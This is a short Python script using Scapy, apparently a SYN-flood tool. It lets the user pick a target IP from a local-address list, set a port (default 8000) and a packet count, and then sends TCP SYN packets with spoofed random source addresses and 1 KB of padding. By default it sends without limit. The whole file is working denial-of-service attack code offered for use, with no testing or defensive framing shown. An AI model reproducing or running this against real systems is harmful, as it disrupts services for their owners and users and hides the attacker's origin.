from scapy.all import *
import Local_address


def main(ip_list):

    choose = int(input("\n\n Choose the IP address : "))
    target_ip = ip_list[choose]

    target_port = 8000

    porty = input("Would you like to set the port number (default port: 8000)? y/n: ")
    if porty.lower() == "y":
        target_port = int(input("Enter the desired port number: "))
        print("Port set to:", target_port)

    packet_num = 0
    packet_numy = input("Would you like to set the packet number (default mode : No limit)? y/n: ")
    if packet_numy.lower() == "y":
        packet_num = int(input("Enter the desired packet number: "))
        print("Packet number set to:", packet_num)

    if packet_num != 0:
        for i in range(packet_num):
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X" * 1024)
            packet = ip / tcp / raw
            send(packet, verbose=False)

            print(f"Sent {i+1} SYN packets to {target_ip}:{target_port}.")
    else:
        ip = IP(src=RandIP(), dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw = Raw(b"X" * 1024)
        packet = ip / tcp / raw
        send(packet, loop=1,verbose=0)

        print("continuous packets sending !!!")


    print("Completed!")

if __name__ == '__main__':
    ip_list=Local_address.info()
    main(ip_list)
